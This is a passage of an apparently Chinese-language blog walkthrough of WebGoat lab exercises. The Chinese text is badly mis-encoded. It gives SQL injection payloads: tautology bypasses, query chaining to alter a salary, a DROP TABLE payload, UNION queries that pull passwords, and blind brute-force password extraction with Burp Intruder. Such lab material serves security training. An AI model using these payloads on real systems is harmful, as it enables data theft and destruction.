<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Introduction_General/16.png" alt="16"></p>
<h4 id="8">8.</h4>
<p>è¿™é¢˜éœ€è¦ä¸‹è½½dockerï¼Œæˆ‘æ‡’å¾—ä¸‹è½½ç›´æ¥å»æ‰¾çš„ç­”æ¡ˆ</p>
<p><a target="_blank" rel="noopener" href="https://blog.51cto.com/hvvyxs/5271326">ã€WebGoaté€šå…³æ€è·¯ã€‘General / Crypto Basics_51CTOåšå®¢_webgoaté€šå…³æ”»ç•¥</a></p>
<p>ç­”æ¡ˆæ˜¯</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.Leaving passwords in docker images is not so secure</span><br><span class="line">2.default_secret</span><br></pre></td></tr></table></figure>
<h3 id="6-Writing-new-lesson">6.Writing new lesson</h3>
<p>ä¸»è¦æ˜¯ä»‹ç»å«ä½ å¦‚ä½•è‡ªå·±åˆ›é€ ä¸€é“é¢˜ç›®ï¼Œè¿™é‡Œæˆ‘ä¹Ÿç›´æ¥ç»™å‡ºç­”æ¡ˆ</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/lusuo/p/17711367.html">webgoaté€šå…³æµç¨‹ - è®©-é›…å…‹-å¢æ¢­ - åšå®¢å›­ (cnblogs.com)</a></p>
<p>ç¬¬ä¸€ç©ºæ˜¯<code>secr37Value</code>ï¼Œç¬¬äºŒç©ºéšæ„</p>
<h2 id="3-Injection">3.Injection</h2>
<h3 id="1-SQL-Injection-intro-ï¼ˆSQLæ³¨å…¥-ç®€å•ç‰ˆï¼‰">1.SQL Injection(intro)ï¼ˆSQLæ³¨å…¥-ç®€å•ç‰ˆï¼‰</h3>
<h4 id="2-2">2.</h4>
<p>å°è¯•æ£€ç´¢å‘˜å·¥ Bob Franco çš„éƒ¨é—¨ã€‚ è¯·æ³¨æ„ï¼Œæ‚¨å·²åœ¨æ­¤åˆ†é…ä¸­è¢«æˆäºˆå®Œå…¨ç®¡ç†å‘˜æƒé™ï¼Œæ— éœ€èº«ä»½éªŒè¯å³å¯è®¿é—®æ‰€æœ‰æ•°æ®ã€‚</p>
<p>ï¼ˆç®€å•çš„mysqlè¯­æ³•ç»ƒæ‰‹ï¼‰</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select department from Employees where userid=96134;</span><br></pre></td></tr></table></figure>
<h4 id="3-2">3.</h4>
<p>å°† Tobi Barnett çš„éƒ¨é—¨æ›´æ”¹ä¸ºâ€œé”€å”®â€ã€‚ è¯·æ³¨æ„ï¼Œæ‚¨å·²åœ¨æ­¤åˆ†é…ä¸­è¢«æˆäºˆå®Œå…¨ç®¡ç†å‘˜æƒé™ï¼Œæ— éœ€èº«ä»½éªŒè¯å³å¯è®¿é—®æ‰€æœ‰æ•°æ®ã€‚</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update employees set department=&#x27;Sales&#x27; where first_name=&#x27;Tobi&#x27;;</span><br></pre></td></tr></table></figure>
<h4 id="4-2">4.</h4>
<p>ç°åœ¨å°è¯•é€šè¿‡å°†åˆ— â€œphoneâ€ ï¼ˆvarcharï¼ˆ20ï¼‰ï¼‰ æ·»åŠ åˆ°è¡¨ â€œemployeesâ€ æ¥ä¿®æ”¹æ¶æ„ã€‚:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table employees add column phone varchar(20);</span><br></pre></td></tr></table></figure>
<h4 id="5-3">5.</h4>
<p>Try to grant rights to the table to user :grant_rightsunauthorized_user</p>
<p>ç»™ç”¨æˆ·unauthorized_userèµ‹äºˆæ“ä½œè¡¨grant_rightsçš„æƒé™ã€‚è¿™é‡Œæ²¡æœ‰é™åˆ¶éœ€è¦ä»€ä¹ˆæƒé™ï¼Œæˆ‘ä»¬æŠŠCRUDçš„æƒé™éƒ½èµ‹äºˆç”¨æˆ·</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grant select,insert,update,delete on grant_rights to unauthorized_user;</span><br></pre></td></tr></table></figure>
<h4 id="9">9.</h4>
<p>Try using the form below to retrieve all the users from the users table. You should not need to know any specific user name to get the complete list.</p>
<p>å°è¯•ä½¿ç”¨ä¸‹é¢çš„è¡¨æ ¼ä»ç”¨æˆ·è¡¨ä¸­æ£€ç´¢æ‰€æœ‰ç”¨æˆ·ã€‚æ‚¨ä¸éœ€è¦çŸ¥é“ä»»ä½•ç‰¹å®šçš„ç”¨æˆ·åå³å¯è·å–å®Œæ•´åˆ—è¡¨ã€‚</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM user_data WHERE first_name = &#x27;John&#x27; AND last_name = &#x27;Smith&#x27; or &#x27;1&#x27; = &#x27;1&#x27;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">è¿™ä¸ªæŸ¥è¯¢ä¹‹æ‰€ä»¥ä¼šè¿”å›æ‰€æœ‰å­—æ®µï¼Œæ˜¯å› ä¸º or <span class="string">&#x27;1&#x27;</span> = <span class="string">&#x27;1&#x27;</span> è¿™ä¸€éƒ¨åˆ†å§‹ç»ˆä¸ºçœŸã€‚å¯¹äºä»»ä½•æ•°æ®åº“æ¥è¯´ï¼Œæ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸² <span class="string">&#x27;1&#x27;</span> å’Œ <span class="string">&#x27;1&#x27;</span> éƒ½æ˜¯ç›¸ç­‰çš„ï¼Œæ‰€ä»¥è¿™ä¸ªæ¡ä»¶æ€»æ˜¯æ»¡è¶³çš„ã€‚</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">æ„å‘³ç€ï¼Œä¸ç®¡ first_name å’Œ last_name çš„å€¼æ˜¯ä»€ä¹ˆï¼Œåªè¦å®ƒä»¬æ»¡è¶³ç»™å®šçš„æ¡ä»¶ï¼Œæˆ–è€… <span class="string">&#x27;1&#x27;</span> = <span class="string">&#x27;1&#x27;</span> è¿™ä¸€æ¡ä»¶æ»¡è¶³ï¼Œè®°å½•å°±ä¼šè¢«é€‰ä¸­ã€‚</span></span><br></pre></td></tr></table></figure>
<h4 id="10">10.</h4>
<p>ä½¿ç”¨ä¸‹é¢çš„ä¸¤ä¸ªè¾“å…¥å­—æ®µï¼Œå°è¯•ä»ç”¨æˆ·è¡¨ä¸­æ£€ç´¢æ‰€æœ‰æ•°æ®ã€‚</p>
<p>è­¦å‘Šï¼šè¿™äº›å­—æ®µä¸­åªæœ‰ä¸€ä¸ªå®¹æ˜“å—åˆ° SQL æ³¨å…¥çš„å½±å“ã€‚æ‚¨éœ€è¦æ‰¾å‡ºå“ªä¸ªï¼Œæ‰èƒ½æˆåŠŸæ£€ç´¢æ‰€æœ‰æ•°æ®ã€‚</p>
<p>é€šè¿‡ä½¿ç”¨<code>1 and 1=1</code>å‘ç°User-Idæ˜¯æ³¨å…¥ç‚¹</p>
<p>Login_Conut:1</p>
<p>User_id:1 or 1=1</p>
<h4 id="11">11.</h4>
<p>ä½ æ˜¯ä¸€ä½åå«çº¦ç¿°Â·å²å¯†æ–¯çš„å‘˜å·¥ï¼Œåœ¨ä¸€å®¶å¤§å…¬å¸å·¥ä½œã€‚ å…¬å¸æœ‰ä¸€ä¸ªå†…éƒ¨ç³»ç»Ÿï¼Œå…è®¸æ‰€æœ‰å‘˜å·¥æŸ¥çœ‹è‡ªå·±çš„å†…éƒ¨æ•°æ®ï¼Œä¾‹å¦‚ä»–ä»¬å·¥ä½œçš„éƒ¨é—¨å’Œä»–ä»¬çš„è–ªæ°´ã€‚</p>
<p>ç³»ç»Ÿè¦æ±‚å‘˜å·¥ä½¿ç”¨å”¯ä¸€çš„èº«ä»½éªŒè¯ TAN æ¥æŸ¥çœ‹å…¶æ•°æ®ã€‚<br>
æ‚¨å½“å‰çš„ TAN æ˜¯ 3SL99Aã€‚</p>
<p>ç”±äºæ‚¨æ€»æ˜¯æ¸´æœ›æˆä¸ºæ”¶å…¥æœ€é«˜çš„å‘˜å·¥ï¼Œå› æ­¤æ‚¨å¸Œæœ›åˆ©ç”¨è¯¥ç³»ç»Ÿï¼Œè€Œä¸æ˜¯æŸ¥çœ‹è‡ªå·±çš„å†…éƒ¨æ•°æ®ï¼Œè€Œæ˜¯æŸ¥çœ‹æ‰€æœ‰åŒäº‹çš„æ•°æ®ä»¥æ£€æŸ¥ä»–ä»¬å½“å‰çš„å·¥èµ„ã€‚</p>
<p>ä½¿ç”¨ä¸‹é¢çš„è¡¨æ ¼ï¼Œå¹¶å°è¯•ä» employees è¡¨ä¸­æ£€ç´¢æ‰€æœ‰å‘˜å·¥æ•°æ®ã€‚æ‚¨æ— éœ€çŸ¥é“ä»»ä½•ç‰¹å®šåç§°æˆ– TAN å³å¯è·å¾—æ‰€éœ€çš„ä¿¡æ¯ã€‚<br>
æ‚¨å·²ç»å‘ç°ï¼Œæ‰§è¡Œè¯·æ±‚çš„æŸ¥è¯¢å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;SELECT * FROM employees WHERE last_name = &#x27;&quot; <span class="operator">+</span> name <span class="operator">+</span> &quot;&#x27; AND auth_tan = &#x27;&quot; <span class="operator">+</span> auth_tan <span class="operator">+</span> &quot;&#x27;&quot;;</span><br><span class="line"># <span class="string">&#x27;&quot; + name + &quot;&#x27;</span>èµ‹å€¼ä¹‹åæ˜¯<span class="string">&#x27;smith&#x27;</span>å› ä¸º<span class="operator">+</span>å†&quot;ä¸­å˜æˆäº†è¿æ¥ç¬¦è¿æ¥&#x27;ï¼Œå¦‚æœå»æ‰+å’Œ&quot;ï¼Œnameä¼šå•çº¯æˆä¸ºå­—ç¬¦ä¸²</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Employee Name:Smith&#x27; or 1 = 1 --</span><br><span class="line">Authentication TAN:123</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">--åœ¨sqlæ˜¯æ³¨é‡Šåé¢è¯­å¥ï¼ŒAuthentication TANä¸ºä»€ä¹ˆéƒ½æ²¡æœ‰å…³ç³»</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ä½†æ˜¯æˆ‘åœ¨Authentication TANä¹Ÿä½¿ç”¨ç›¸åŒçš„æ‰‹æ³•ä½†æ˜¯æ²¡æœ‰æˆåŠŸï¼Œè¯´æ˜è¿™é‡Œä¸æ˜¯æ³¨å…¥ç‚¹</span></span><br></pre></td></tr></table></figure>
<h4 id="12">12.</h4>
<p>Query chaining is exactly what it sounds like. With query chaining, you try to append one or more queries to the end of the actual query. You can do this by using the ; metacharacter. A ; marks the end of a SQL statement; it allows one to start another query right after the initial query without the need to even start a new line.</p>
<p>It is your turn!<br>
You just found out that Tobi and Bob both seem to earn more money than you! Of course you cannot leave it at that.<br>
Better go and change your own salary so you are earning the most!</p>
<p>Remember: Your name is John Smith and your current TAN is 3SL99A.</p>
<p>æŸ¥è¯¢é“¾æ¥é¡¾åæ€ä¹‰ã€‚ä½¿ç”¨æŸ¥è¯¢é“¾æ¥ï¼Œæ‚¨å¯ä»¥å°è¯•å°†ä¸€ä¸ªæˆ–å¤šä¸ªæŸ¥è¯¢è¿½åŠ åˆ° å®é™…æŸ¥è¯¢ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ ; å…ƒå­—ç¬¦æ¥æ‰§è¡Œæ­¤æ“ä½œã€‚A ;æ ‡è®° SQL è¯­å¥çš„ç»“å°¾;å®ƒå…è®¸åœ¨åˆå§‹æŸ¥è¯¢ä¹‹åç«‹å³å¯åŠ¨å¦ä¸€ä¸ªæŸ¥è¯¢ï¼Œç”šè‡³ä¸éœ€è¦å¼€å§‹æ–°è¡Œã€‚</p>
<p>è½®åˆ°ä½ äº†ï¼<br>
ä½ åˆšåˆšå‘ç° Tobi å’Œ Bob ä¼¼ä¹éƒ½æ¯”ä½ èµšæ›´å¤šçš„é’±ï¼ å½“ç„¶ï¼Œä½ ä¸èƒ½å°±æ­¤ç½¢ä¼‘ã€‚<br>
æœ€å¥½å»æ”¹å˜ä½ è‡ªå·±çš„å·¥èµ„ï¼Œè¿™æ ·ä½ èµšå¾—æœ€å¤šï¼</p>
<p>è¯·è®°ä½ï¼šæ‚¨çš„åå­—æ˜¯ John Smithï¼Œæ‚¨å½“å‰çš„ TAN æ˜¯ 3SL99Aã€‚</p>
<p>å’Œä¸Šé¢˜ä¸€æ ·ï¼Œç¬¬äºŒç©ºå¡«ä¸å¡«éƒ½æ— æ‰€è°“</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Smith&#x27;;update employees set salary=144514 where auth_tan=&#x27;3SL99A&#x27;--</span><br></pre></td></tr></table></figure>
<h4 id="13">13.</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;drop table access_log;--</span><br></pre></td></tr></table></figure>
<h3 id="2-SQL-injection-advanced-ï¼ˆSQLæ³¨å…¥-é«˜çº§ç‰ˆï¼‰">2.SQL injection(advanced)ï¼ˆSQLæ³¨å…¥-é«˜çº§ç‰ˆï¼‰</h3>
<h4 id="3-3">3.</h4>
<h5 id="ç¬¬ä¸€ç§å†™æ³•">ç¬¬ä¸€ç§å†™æ³•</h5>
<p>ç¬¬ä¸€ç©º</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Smith&#x27; UNION SELECT userid,user_name, password, &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, 1 from user_system_data --</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">å®Œæ•´è¯­å¥</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">åœ¨SQLä¸­ï¼ŒUNIONæ“ä½œç¬¦ç”¨äºåˆå¹¶ä¸¤ä¸ªæˆ–å¤šä¸ªSELECTè¯­å¥çš„ç»“æœé›†ã€‚è¿™äº›SELECTè¯­å¥å¯ä»¥æ¥è‡ªåŒä¸€ä¸ªè¡¨ï¼Œä¹Ÿå¯ä»¥æ¥è‡ªä¸åŒçš„è¡¨ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œç¬¬ä¸€ä¸ªSELECTè¯­å¥æ˜¯æ¥è‡ªuser_dataè¡¨ï¼Œè€Œç¬¬äºŒä¸ªSELECTè¯­å¥æ˜¯æ¥è‡ªuser_system_dataè¡¨ã€‚</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">ç¬¬äºŒä¸ªSELECTè¯­å¥ä¸­ï¼Œä½ é€‰æ‹©äº†user_nameå’Œpasswordå­—æ®µï¼Œå¹¶æ·»åŠ äº†ä¸€äº›å¸¸é‡å€¼ï¼ˆå¦‚1å’Œ<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>ï¼‰ã€‚è¿™äº›å¸¸é‡å€¼å¹¶ä¸æ˜¯æ¥è‡ªuser_system_dataè¡¨çš„å­—æ®µï¼Œè€Œæ˜¯ä¸ºäº†æ»¡è¶³UNIONæ“ä½œç¬¦çš„è¦æ±‚è€Œæ·»åŠ çš„ã€‚</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">åœ¨UNIONæ“ä½œä¸­ï¼Œæ¯ä¸ªSELECTè¯­å¥å¿…é¡»å…·æœ‰ç›¸åŒçš„åˆ—æ•°ï¼Œå¹¶ä¸”ç›¸åº”çš„åˆ—å¿…é¡»æœ‰å…¼å®¹çš„æ•°æ®ç±»å‹ã€‚å› æ­¤ï¼Œå¦‚æœä½ æƒ³å°†ä¸¤ä¸ªæŸ¥è¯¢çš„ç»“æœåˆå¹¶åœ¨ä¸€èµ·ï¼Œä½ éœ€è¦ç¡®ä¿ç¬¬äºŒä¸ªæŸ¥è¯¢çš„åˆ—æ•°ä¸ç¬¬ä¸€ä¸ªæŸ¥è¯¢åŒ¹é…ã€‚åœ¨è¿™é‡Œï¼Œç¬¬ä¸€ä¸ªæŸ¥è¯¢é€‰æ‹©äº†æ‰€æœ‰åˆ—ï¼Œæ‰€ä»¥ç¬¬äºŒä¸ªæŸ¥è¯¢ä¹Ÿéœ€è¦é€‰æ‹©ç›¸åŒæ•°é‡çš„åˆ—ã€‚</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">è¿™äº›å¸¸é‡å€¼åœ¨ç»“æœé›†ä¸­ä¸ä¼šäº§ç”Ÿå®é™…çš„æ•°æ®ï¼Œå› ä¸ºå®ƒä»¬ä¸æŸ¥è¯¢çš„å®é™…ç»“æœä¸åŒ¹é…ã€‚å®ƒä»¬ä»…ä»…æ˜¯ä¸ºäº†æ»¡è¶³UNIONçš„ç»“æ„è¦æ±‚ã€‚</span></span><br></pre></td></tr></table></figure>
<p>å‘ç°å¯†ç </p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passW0rD</span><br></pre></td></tr></table></figure>
<h5 id="ç¬¬äºŒç§å†™æ³•">ç¬¬äºŒç§å†™æ³•</h5>
<p>åŸç†å…¶å®éƒ½ä¸€æ ·ã€‚ã€‚ã€‚</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Smith&#x27; UNION SELECT 1,udt.user_name,udt.password,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,5 FROM user_data ud RIGHT JOIN user_system_data udt ON ud.userid=udt.userid;--</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Smith<span class="string">&#x27;ï¼šè¿™éƒ¨åˆ†å°è¯•åŒ¹é…user_dataè¡¨ä¸­last_nameä¸º&#x27;</span>Smith<span class="string">&#x27;çš„è®°å½•ã€‚</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="string">UNIONï¼šè¿™æ˜¯ä¸€ä¸ªSQLæ“ä½œç¬¦ï¼Œç”¨äºåˆå¹¶ä¸¤ä¸ªæˆ–å¤šä¸ªSELECTè¯­å¥çš„ç»“æœé›†ã€‚</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="string">SELECT 1,udt.user_name,udt.password,â€˜2â€™,â€˜3â€™,â€˜4â€™,5ï¼šè¿™éƒ¨åˆ†æ˜¯ç¬¬äºŒä¸ªSELECTè¯­å¥ï¼Œå®ƒä»user_system_dataè¡¨ä¸­é€‰æ‹©æ•°æ®ã€‚è¿™é‡Œé€‰æ‹©äº†user_nameå’Œpasswordå­—æ®µï¼Œå¹¶æ·»åŠ äº†ä¸€äº›å¸¸é‡å€¼ï¼ˆ1, &#x27;</span>2<span class="string">&#x27;, &#x27;</span>3<span class="string">&#x27;, &#x27;</span>4<span class="string">&#x27;, 5ï¼‰ã€‚</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="string">FROM user_data udï¼šè¿™éƒ¨åˆ†æŒ‡å®šäº†ç¬¬ä¸€ä¸ªSELECTè¯­å¥çš„æ¥æºè¡¨ï¼Œå³user_dataï¼Œå¹¶ç»™å®ƒèµ·äº†ä¸€ä¸ªåˆ«åudã€‚</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="string">RIGHT JOIN user_system_data udt ON ud.userid=udt.userid;ï¼šè¿™éƒ¨åˆ†æ˜¯ä¸€ä¸ªè¿æ¥æ“ä½œã€‚å®ƒè¯•å›¾å°†user_dataè¡¨ï¼ˆåˆ«åä¸ºudï¼‰ä¸user_system_dataè¡¨ï¼ˆåˆ«åä¸ºudtï¼‰è¿›è¡Œå³è¿æ¥ï¼Œè¿æ¥æ¡ä»¶æ˜¯ä¸¤ä¸ªè¡¨ä¸­çš„useridå­—æ®µç›¸ç­‰ã€‚</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="string">--ï¼šè¿™æ˜¯SQLä¸­çš„æ³¨é‡Šç¬¦å·ï¼Œç”¨äºéšè—æ³¨å…¥çš„SQLä»£ç ï¼Œä½¿å…¶æ›´éš¾ä»¥è¢«æ•°æ®åº“æ£€æµ‹åˆ°ã€‚</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="string">æ•´ä½“ä¸Šï¼Œè¿™æ®µä»£ç çš„ç›®çš„æ˜¯é€šè¿‡SQLæ³¨å…¥æ”»å‡»æ¥è·å–æ•°æ®åº“ä¸­æ•æ„Ÿçš„æ•°æ®ã€‚å®ƒé¦–å…ˆé€šè¿‡&#x27;</span>Smith<span class="string">&#x27;è¿™ä¸ªæ¡ä»¶ä»user_dataè¡¨ä¸­ç­›é€‰å‡ºä¸&#x27;</span>Smith<span class="string">&#x27;ç›¸å…³çš„è®°å½•ï¼Œç„¶åä½¿ç”¨UNIONæ“ä½œç¬¦å°†ç»“æœä¸ä»user_system_dataè¡¨ä¸­è·å–çš„æ•°æ®åˆå¹¶åœ¨ä¸€èµ·ã€‚ç”±äºè¿™æ˜¯ä¸€ä¸ªå³è¿æ¥ï¼Œå®ƒä¼šè¿”å›æ‰€æœ‰åœ¨user_dataè¡¨ä¸­çš„è®°å½•ï¼Œä»¥åŠä¸ä¹‹ç›¸å…³è”çš„user_system_dataè¡¨ä¸­çš„è®°å½•</span></span></span><br></pre></td></tr></table></figure>
<p>ç„¶åè¾“å…¥passwordå°±è¡Œäº†</p>
<h4 id="5-4">5.</h4>
<blockquote>
<p>è¿™é¢˜æˆ‘æ˜¯çœŸçš„è¦åæ§½å•Šï¼Œé¢˜ç›®è¯´äº†æ˜¯Tomï¼Œç»“æœæˆ‘æŠ“åŒ…çš„æ—¶å€™ä¿®æ”¹æˆtomæ‰æœ‰ç”¨ğŸ˜…</p>
</blockquote>
<p>1.æŒ‰ç…§é¢˜ç›®è¦æ±‚è¯´äº†æ¼æ´åœ¨æ³¨å†Œï¼Œé‚£ä¹ˆæ³¨å†Œçš„æ—¶å€™æŠ“åŒ…</p>
<p>2.å‘é€åˆ°repeateræ¨¡å—åˆ©ç”¨<code>username_reg=tom'+and+password=1</code>è¿”å›çš„outputæ˜¯none</p>
<p>è€Œ<code>username_reg=tom'+and+passwor=1</code>è¿”å›çš„æ˜¯é”™è¯¯something went wrong</p>
<p>è¯´æ˜å¯†ç çš„å­—æ®µåæ˜¯password</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/8.png" alt=""></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/9.png" alt=""></p>
<p>3.ç„¶ååˆ©ç”¨<code>username_reg=tom'+and+(length(password) &gt; 10) --</code>åˆ¤æ–­å¯†ç é•¿åº¦</p>
<p>è‹¥æ­£ç¡®åˆ™è¿”å›<code>User &#123;0&#125; already exists please try to register with a different username.</code></p>
<p>é”™è¯¯åˆ™è¿”å›ä½ çš„è¾“å…¥</p>
<p>ç»“æŸä¹‹åçŸ¥é“é•¿åº¦ä¸º23</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/6.png" alt=""></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/7.png" alt=""></p>
<p>4.å‘é€åˆ°Intruderæ¨¡å—çˆ†ç ´</p>
<p>ä¿®æ”¹username_reg</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tom&#x27; and substring(password,1,1)=â€™1â€™--</span><br></pre></td></tr></table></figure>
<p>å…ˆè®¾ç½®å¥½çˆ†ç ´ä½ç½®ï¼Œå³åé¢ä¸¤ä¸ª1çš„ä½ç½®ï¼Œç„¶åé€‰æ‹©ç¬¬å››ä¸ªé›†æŸç‚¸å¼¹ï¼ˆClusterbombï¼‰</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/3.png" alt=""></p>
<p>è¿›å…¥Intruder/Payloadsï¼Œpayloadå³æ˜¯Positionsé¡µé¢çš„è®¾ç½®å¥½çš„çˆ†ç ´ä½ç½®å˜é‡ï¼Œæ•°å­—é»˜è®¤é¡ºåºä»å·¦å¾€å³é€’å¢ã€‚</p>
<p>è´Ÿè½½1è¡¨ç¤ºéå†ç¬¬1è‡³ç¬¬23ä½æ•°</p>
<p>è´Ÿè½½2è¡¨ç¤ºç¬¬ä¸€ä¸ªå˜é‡ï¼ˆè´Ÿè½½1ï¼‰çš„æ‰€æœ‰å¯èƒ½æ€§ã€‚</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/5.png" alt=""></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/4.png" alt=""></p>
<p>è¿›è¡Œçˆ†ç ´</p>
<p>æŸ¥çœ‹é•¿åº¦æœ€å°çš„æ’åºå°±æ˜¯å¯†ç </p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/1.png" alt=""></p>
<p>ç„¶åå¯ä»¥è¯•ä¸€ä¸ªå‘é€ä¸ªrepeateræ¨¡å—</p>
<p>ç¡®å®æ²¡æœ‰é—®é¢˜</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/2.png" alt=""></p>
<p>ä½†æ˜¯ä¸€æ¬¡æ²¡æœ‰æ”¶é›†å…¨æ‰€æœ‰ä½æ•°çš„å­—æ¯ï¼Œæ˜¯å› ä¸ºæœ‰äº›è¯·æ±‚å‡ºé”™äº†ï¼Œç»è¿‡å¤šæ¬¡æ”»å‡»å¯ä»¥é›†é½æ‰€æœ‰ä½å­—æ¯ã€‚<br>
æœ€ç»ˆç­”æ¡ˆï¼šthisisasecretfortomonly<br>
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23<br>
t h i s i s a s e c r e t f o r t o m o n l y<br>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/10.png" alt=""></p>
<h4 id="6-3">6.</h4>
<h5 id="1">1.</h5>
<p>é¢„ç¼–è¯‘è¯­å¥ï¼ˆPrepared Statementï¼‰å’Œæ™®é€šè¯­å¥ï¼ˆStatementï¼‰çš„ä¸»è¦åŒºåˆ«ï¼š</p>
<ol>
